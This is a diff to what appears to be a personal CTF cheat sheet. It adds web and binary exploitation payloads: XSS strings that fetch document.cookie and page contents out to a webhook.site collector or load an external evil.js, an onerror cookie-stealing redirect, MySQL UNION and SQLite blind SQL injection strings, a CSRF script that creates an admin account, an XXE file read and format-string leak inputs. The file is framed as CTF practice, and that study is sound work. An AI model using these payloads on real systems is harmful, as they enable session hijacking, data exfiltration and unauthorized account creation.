@@ -1225,6 +1225,7 @@ x/w $rbp-0x4
 x/2b 0x00000000000072a
 x/2x 0x00000000000072a
 x/s $si
+display $eax
 
 # Commands(General)
 run auth2 < input.txt
@@ -1499,16 +1500,17 @@ http://websec.fr/
 
 ```bash
 # Payload
-">'>< script>fetch("https://webhook.site/<ID>/?c="+document.cookie)< /script>
-">'>< script src="https://example.com/evil.js">< /script>
+">'><script>fetch("https://webhook.site/<ID>/?c="+document.cookie)</script>
+">'><script src="https://example.com/evil.js"></script>
+<img src=x onerror="location.href='https://webhook.site/<ID>/?e='+document.cookie">
 
 #=====Script(1)======
 <script>
-var xml = new XMLHttpRequest()
-xml.open("GET","index.php",false)
-xml.send()
-fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText))
-//fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText).substr(0,1000))
+var xml = new XMLHttpRequest();
+xml.open("GET","index.php",false);
+xml.send();
+fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText));
+//fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText).substr(0,1000));
 </script>
 =====================
 
@@ -1522,13 +1524,46 @@ fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText))
 ### SQL Injection
 
 ```bash
-=> Payload (MSQL)
+=> (MYSQL)
 
 1 UNION ALL SELECT 1,2,3,4 --
 1 UNION ALL SELECT 1,database(),3,4 --
 1 UNION ALL SELECT 1,table_schema,3,4  FROM information_schema.tables--
 1 UNION ALL SELECT 1,column_name,table_name,4  FROM information_schema.columns--
 1 UNION ALL SELECT 1,flag,3,4 FROM found_me--
+
+=> SQLITE3
+
+case when (1=1) then 0 else randomblob(100000000000000) end
+case when substr((select flag from ctf),1,1)='f' then 0 else randomblob(100000000000000) end
+```
+
+#### CSRF
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md
+
+```bash
+====(1)====
+-> Hosted (using ngrok/vps) : https://10.10.10.10/csrf.html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://localhost/addadmin.php");
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("username=admin3&password=admin3");
+</script>
+```
+
+
+#### XXE
+
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md
+
+```bash
+====(1)====
+<!DOCTYPE root [<!ENTITY example SYSTEM 'file:///flag.txt'>]>
+<score>&example;</score>
+
+====(2)====
+
 ```
 
 # Binary Exploitation
@@ -1567,7 +1602,7 @@ https://github.com/ChrisTheCoolHut/Zeratool
 python3 -c "print('A' * 4 + '-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')" | ./format
 python3 -c "print('AAAABBBB' + '-%x-%x-%x-%x-%x-%5$s-')" | ./format
 echo 'AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-' | ./format
-
+echo '%16$p' | ./format 
 
 #Format String vulnerabilities.
 - Leaking secrets
@@ -1581,6 +1616,8 @@ echo 'AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-' | ./format
 - https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability
 - https://resources.infosecinstitute.com/topic/how-to-exploit-format-string-vulnerabilities/
 - https://owasp.org/www-community/attacks/Format_string_attack
+- https://ctf-wiki.mahaloz.re/pwn/linux/fmtstr/fmtstr_intro/
+- https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
 ```
 
 ### ShellCode
